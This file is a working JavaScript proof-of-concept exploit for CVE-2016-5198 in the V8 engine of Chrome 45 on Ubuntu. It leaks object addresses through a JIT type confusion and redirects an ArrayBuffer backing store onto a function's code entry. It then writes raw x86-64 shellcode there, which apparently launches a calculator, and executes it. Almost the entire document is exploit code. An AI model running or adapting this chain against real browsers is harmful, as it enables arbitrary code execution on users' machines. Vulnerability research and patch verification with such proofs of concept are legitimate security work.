/* PoC of CVE-2016-5198 for Chrome 45.0.2454.85 (64-bit) on Ubuntu 14.04
 * thanks to sakura 's awesome blog https://xz.aliyun.com/t/2889
 */

var is_debug = true;

function breakpoint() {
  if (is_debug) {
    // bp chrome_child!v8::internal::Runtime_MathAtan2
    Math.atan2(1)
  }
}

// int->double
// d2u(intaddr/0x100000000,intaddr&0xffffffff)
function d2u(num1,num2){
    d = new Uint32Array(2);
    d[0] = num2;
    d[1] = num1;
    f = new Float64Array(d.buffer);
    return f[0];
}
// double->int
// u2d(floataddr)
function u2d(num){
    f = new Float64Array(1);
    f[0] = num;
    d = new Uint32Array(f.buffer);
    return d[1] * 0x100000000 + d[0];
}

var n;
var m;
var l;
var arr_buf = new ArrayBuffer(0x200);
var str = new String(null);
//var func_body = "eval('');";
//for (var i = 0; i < 2000; ++i) {
//  func_body += "a[" + i.toString() + "];";
//}
//var func = new Function("a", func_body);
var func = new Function();

function Ctor() {
  n = new Set();
}
function Check(obj) {
  n.xyz = 3.476686391900666e-308;
  n.xyz1 = 0;
  n.xyz2 = 0x7000;
  n.xyz3 = obj;
}
function Ctor2() {
  m = new Map();
}
function Check2(addr) {
  m.xyz = 3.476686391900666e-308;
  m.xyz1 = 0;
  m.xyz2 = 0x7000;
  m.xyz3 = addr;
}
function Ctor3() {
  l = new ArrayBuffer();
}
function Check3(addr) {
  l.xyz = 3.476686391900666e-308;
  l.xyz1 = addr;
}

// 必须先将Ctor变hot进行optimize，不然之后Check会在Ctor调用后deoptimize
for (var i = 0; i < 2000; ++i) {
  Ctor();
  Ctor2();
  Ctor3();
}
for (var i = 0; i < 10000; ++i) {
  Check();
//  Check2();
//  Check3();
}
//for (var i = 0; i < 2000; ++i) {
//  Ctor2();
//}
//for (var i = 0; i < 10000; ++i) {
//  Check2();
//}
breakpoint(); // b v8::internal::Runtime_MathAtan2

print("Step 1: address info leak");
Ctor();
Check(String(null));
var null_str_addr = str.charCodeAt(0)*0x1 + str.charCodeAt(1)*0x100 + str.charCodeAt(2)*0x10000 + str.charCodeAt(3)*0x1000000 
  + str.charCodeAt(4)*0x100000000 + str.charCodeAt(5)*0x10000000000 + str.charCodeAt(6)*0x1000000000000 + str.charCodeAt(7)*0x100000000000000;
print("[leak] null string address: 0x" + null_str_addr.toString(16));
Ctor();
Check(arr_buf);
var arr_buf_addr = str.charCodeAt(0)*0x1 + str.charCodeAt(1)*0x100 + str.charCodeAt(2)*0x10000 + str.charCodeAt(3)*0x1000000 
  + str.charCodeAt(4)*0x100000000 + str.charCodeAt(5)*0x10000000000 + str.charCodeAt(6)*0x1000000000000 + str.charCodeAt(7)*0x100000000000000;
print("[leak] array buffer address: 0x" + arr_buf_addr.toString(16));

Ctor();
Check(func);
var func_obj_addr = str.charCodeAt(0)*0x1 + str.charCodeAt(1)*0x100 + str.charCodeAt(2)*0x10000 + str.charCodeAt(3)*0x1000000 
  + str.charCodeAt(4)*0x100000000 + str.charCodeAt(5)*0x10000000000 + str.charCodeAt(6)*0x1000000000000 + str.charCodeAt(7)*0x100000000000000;
print("[leak] function object address: 0x" + func_obj_addr.toString(16));

Ctor();
Check(String(null));
var null_str_addr = str.charCodeAt(0)*0x1 + str.charCodeAt(1)*0x100 + str.charCodeAt(2)*0x10000 + str.charCodeAt(3)*0x1000000 
  + str.charCodeAt(4)*0x100000000 + str.charCodeAt(5)*0x10000000000 + str.charCodeAt(6)*0x1000000000000 + str.charCodeAt(7)*0x100000000000000;
print("make null string point to itself: 0x" + null_str_addr.toString(16));

print("Step 2: overwrite String hash with array buffer backing store offset - 0x8");
//                    +-----+------------+----------+---------------+--------+-----+
// JSArrayBuffer ---> | Map | Properties | Elements | Backing Store | Length | ... |
//                    +-----+------------+----------+---------------+--------+-----+
//                   0x0   0x8          0x10       0x18            0x20     0x28    
var arr_buf_elements_addr = arr_buf_addr + 0x10;
var arr_buf_elements_addr_val = d2u(arr_buf_elements_addr / 0x100000000, arr_buf_elements_addr & 0xffffffff);

for (var i = 0; i < 10000; ++i) {
  Check2(arr_buf_elements_addr_val);
}
// breakpoint();
Ctor2();
Check2(arr_buf_elements_addr_val);

print("Step 3: overwrite array buffer backing store with func addr");
var func_addr = func_obj_addr - 1;
var func_addr_val = d2u(func_addr / 0x100000000, func_addr & 0xffffffff);

for (var i = 0; i < 10000; ++i) {
  Check3(func_addr_val);
}
// breakpoint();
Ctor3();
Check3(func_addr_val);

print("Step 4: fill backing store (func CodeEntry) with shellcode");
var f64 = new Float64Array(arr_buf);
// get JSFunction kCodeEntryOffset
var shellcode_addr_float = f64[3];

// set backing store with JSFunction kCodeEntryOffset
Check3(shellcode_addr_float);

var shellcode = [].concat([
0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 
0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 
0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 
0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 
0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 
0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 
0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 
0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 
0x00, 0x0f, 0x05]);
(new Uint8Array(arr_buf)).set(shellcode, 0);

print("Step 5: execute shellcode");
func();
